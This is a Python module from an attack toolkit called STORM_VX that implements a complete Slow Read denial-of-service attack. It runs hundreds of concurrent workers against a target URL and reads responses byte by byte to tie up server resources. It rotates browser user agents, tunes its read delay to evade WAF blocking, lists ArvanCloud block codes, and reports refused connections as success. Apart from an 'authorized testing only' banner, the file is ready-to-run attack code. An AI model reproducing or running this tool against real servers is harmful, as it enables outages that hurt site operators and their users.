#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  VF Slow READ — Slow Read DoS Attack Module                            ║
║  Part of the STORM_VX Toolkit                                          ║
║                                                                          ║
║  Complement to Slowloris. Opens connections, sends valid HTTP requests, ║
║  but reads the response extremely slowly (1 byte/sec). Server keeps     ║
║  connections open, consuming resources (memory, threads, file handles). ║
║  When enough connections are held open, the server runs out of          ║
║  resources and starts refusing new connections.                         ║
║                                                                          ║
║  FOR AUTHORIZED TESTING ONLY!                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import random
import socket
import ssl
from typing import Dict, Optional
from urllib.parse import urlparse


# ─── Color Codes ──────────────────────────────────────────────────────────────

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'


# ─── User-Agent Pool ─────────────────────────────────────────────────────────

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1",
]

def random_ua() -> str:
    return random.choice(USER_AGENTS)


class SlowREADAttacker:
    """
    Slow READ Attack.

    Opens TCP connections, sends complete HTTP GET requests,
    then reads the response at an extremely slow rate (e.g., 1 byte/sec).
    The server must keep the connection open and hold resources in memory
    while waiting for the client to consume the response.

    Key metrics:
    - Active connections held open = server resources consumed
    - Connection refused = server overwhelmed (success!)
    - Auto-adjusts read speed based on server behavior

    ArvanCloud blocking codes: 403, 429, 500, 503
    """

    def __init__(self, url: str, workers: int = 200, read_delay: float = 1.0, timeout: int = 300):
        self.url = url
        self.workers = workers
        self.read_delay = read_delay  # Seconds between each byte read
        self.timeout = timeout  # Max seconds to hold a connection
        self.parsed = urlparse(url)
        self.host = self.parsed.hostname or ""
        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        self.is_ssl = self.parsed.scheme == "https"

        # Stats tracking
        self.stats = {
            "active_connections": 0,
            "total_connections_opened": 0,
            "closed_connections": 0,
            "bytes_read": 0,
            "connection_refused": 0,
            "timeout_expired": 0,
            "waf_blocked": 0,
            "errors": 0,
            "server_overwhelmed": False,
        }
        self._lock = asyncio.Lock()
        self._start_time = 0.0
        self._current_read_delay = read_delay

    async def _update_stats(self, key: str, delta: int = 1):
        """Thread-safe stats update."""
        async with self._lock:
            self.stats[key] = self.stats.get(key, 0) + delta

    async def _set_stats(self, key: str, value):
        """Thread-safe stats set."""
        async with self._lock:
            self.stats[key] = value

    async def _get_stats(self) -> Dict:
        """Get a copy of current stats."""
        async with self._lock:
            return dict(self.stats)

    def _build_get_request(self) -> bytes:
        """Build a valid HTTP GET request."""
        path = self.parsed.path or "/"
        if self.parsed.query:
            path += f"?{self.parsed.query}"
        # Add cache buster
        path += f"{'&' if '?' in path else '?'}_={random.randint(100000, 999999)}"

        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {random_ua()}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Accept-Encoding: identity\r\n"  # No compression — easier to read slowly
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
        return request.encode("utf-8")

    async def _auto_adjust_delay(self):
        """Auto-adjust read delay based on server behavior."""
        stats = await self._get_stats()
        refused = stats.get("connection_refused", 0)
        blocked = stats.get("waf_blocked", 0)
        closed = stats.get("closed_connections", 0)

        # If server is refusing connections = we're winning, slow down more
        if refused > 5:
            self._current_read_delay = min(self._current_read_delay * 1.2, 5.0)
            await self._set_stats("server_overwhelmed", True)

        # If being blocked by WAF, speed up slightly to rotate faster
        elif blocked > 10:
            self._current_read_delay = max(self._current_read_delay * 0.8, 0.1)

        # If connections are closing fast, slow down more to hold them open
        elif closed > stats.get("active_connections", 0):
            self._current_read_delay = min(self._current_read_delay * 1.1, 5.0)

    async def _slow_read_worker(self, worker_id: int, stop_event: asyncio.Event):
        """Single worker that holds one connection open with slow reads."""
        while not stop_event.is_set():
            reader: Optional[asyncio.StreamReader] = None
            writer: Optional[asyncio.StreamWriter] = None

            try:
                # Open connection
                if self.is_ssl:
                    ssl_ctx = ssl.create_default_context()
                    ssl_ctx.check_hostname = False
                    ssl_ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.host, self.port, ssl=ssl_ctx),
                        timeout=15,
                    )
                else:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.host, self.port),
                        timeout=15,
                    )

                await self._update_stats("active_connections")
                await self._update_stats("total_connections_opened")

                # Send complete GET request
                request = self._build_get_request()
                writer.write(request)
                await writer.drain()

                # Read response very slowly
                connection_start = time.time()
                bytes_read = 0
                read_delay = self._current_read_delay

                while not stop_event.is_set():
                    # Check if we've held the connection long enough
                    elapsed = time.time() - connection_start
                    if elapsed >= self.timeout:
                        await self._update_stats("timeout_expired")
                        break

                    try:
                        # Read 1 byte at a time with delay
                        chunk = await asyncio.wait_for(
                            reader.read(1), timeout=30
                        )
                        if not chunk:
                            # Connection closed by server
                            break

                        bytes_read += 1
                        await self._update_stats("bytes_read")

                        # Sleep between reads (slow consumption)
                        await asyncio.sleep(read_delay)

                    except asyncio.TimeoutError:
                        # Server isn't sending data — might have closed
                        break
                    except (ConnectionResetError, BrokenPipeError):
                        break

            except ConnectionRefusedError:
                await self._update_stats("connection_refused")
                await self._set_stats("server_overwhelmed", True)
                # Server is overwhelmed! Brief pause then retry
                await asyncio.sleep(random.uniform(0.5, 2.0))

            except asyncio.TimeoutError:
                await self._update_stats("errors")

            except OSError:
                await self._update_stats("errors")

            except Exception:
                await self._update_stats("errors")

            finally:
                await self._update_stats("active_connections", -1)
                await self._update_stats("closed_connections")

                if writer:
                    try:
                        writer.close()
                        await writer.wait_closed()
                    except Exception:
                        pass

            # Brief pause before reopening connection
            if not stop_event.is_set():
                await asyncio.sleep(random.uniform(0.01, 0.05))

    async def _print_stats(self, stop_event: asyncio.Event):
        """Print real-time statistics."""
        while not stop_event.is_set():
            elapsed = time.time() - self._start_time
            stats = await self._get_stats()

            active = stats.get("active_connections", 0)
            total_opened = stats.get("total_connections_opened", 0)
            closed = stats.get("closed_connections", 0)
            bytes_read = stats.get("bytes_read", 0)
            refused = stats.get("connection_refused", 0)
            blocked = stats.get("waf_blocked", 0)
            overwhelmed = stats.get("server_overwhelmed", False)

            status_color = C.R if overwhelmed else C.G if active > 100 else C.Y

            print(
                f"{C.Y}[SLOW-READ]{C.RS} "
                f"{C.BD}t={elapsed:.0f}s{C.RS} | "
                f"Active: {status_color}{active}{C.RS} | "
                f"Total: {C.W}{total_opened}{C.RS} | "
                f"Closed: {C.DM}{closed}{C.RS} | "
                f"Bytes: {C.CY}{bytes_read:,}{C.RS} | "
                f"Refused: {C.R if refused > 0 else C.DM}{refused}{C.RS} | "
                f"Blocked: {C.R}{blocked}{C.RS} | "
                f"Delay: {C.B}{self._current_read_delay:.2f}s/byte{C.RS}"
            )

            if overwhelmed:
                print(f"  {C.R}{C.BD}SERVER IS OVERWHELMED — refusing connections!{C.RS}")

            # Auto-adjust delay periodically
            await self._auto_adjust_delay()
            await asyncio.sleep(3)

    async def attack(self, stop_event: asyncio.Event, stats_callback=None) -> Dict:
        """
        Main attack entry point.

        Args:
            stop_event: Event to signal graceful shutdown.
            stats_callback: Optional callback for external stats reporting.

        Returns:
            Dict with attack statistics.
        """
        self._start_time = time.time()

        print(f"{C.BD}[SLOW-READ] Starting Slow READ attack{C.RS}")
        print(f"  Target: {C.CY}{self.host}:{self.port}{C.RS}")
        print(f"  Workers: {C.W}{self.workers}{C.RS}")
        print(f"  Read delay: {C.W}{self.read_delay}s/byte{C.RS}")
        print(f"  Connection timeout: {C.W}{self.timeout}s{C.RS}")
        print(f"  Strategy: Hold connections open with extremely slow response reading{C.RS}")

        # Launch worker tasks
        tasks = []
        for i in range(self.workers):
            task = asyncio.create_task(self._slow_read_worker(i, stop_event))
            tasks.append(task)

        # Stats printer
        stats_task = asyncio.create_task(self._print_stats(stop_event))

        # Wait for stop signal
        try:
            await stop_event.wait()
        except asyncio.CancelledError:
            pass

        # Cleanup
        stats_task.cancel()
        for task in tasks:
            task.cancel()

        await asyncio.gather(stats_task, *tasks, return_exceptions=True)

        # Final stats
        elapsed = time.time() - self._start_time
        final_stats = await self._get_stats()
        final_stats["elapsed_seconds"] = round(elapsed, 2)
        final_stats["connections_per_second"] = round(
            final_stats.get("total_connections_opened", 0) / max(elapsed, 1), 2
        )
        final_stats["bytes_per_second"] = round(
            final_stats.get("bytes_read", 0) / max(elapsed, 1), 2
        )
        final_stats["avg_hold_time"] = round(
            elapsed / max(final_stats.get("total_connections_opened", 1), 1), 2
        )

        print(f"\n{C.BD}[SLOW-READ] Attack finished{C.RS}")
        print(f"  Total connections: {C.W}{final_stats.get('total_connections_opened', 0)}{C.RS}")
        print(f"  Bytes read: {C.CY}{final_stats.get('bytes_read', 0):,}{C.RS}")
        print(f"  Connections refused: {C.R}{final_stats.get('connection_refused', 0)}{C.RS}")
        print(f"  Server overwhelmed: {C.R if final_stats.get('server_overwhelmed') else C.G}{final_stats.get('server_overwhelmed')}{C.RS}")
        print(f"  WAF blocked: {C.R}{final_stats.get('waf_blocked', 0)}{C.RS}")

        if stats_callback:
            await stats_callback(final_stats)

        return final_stats
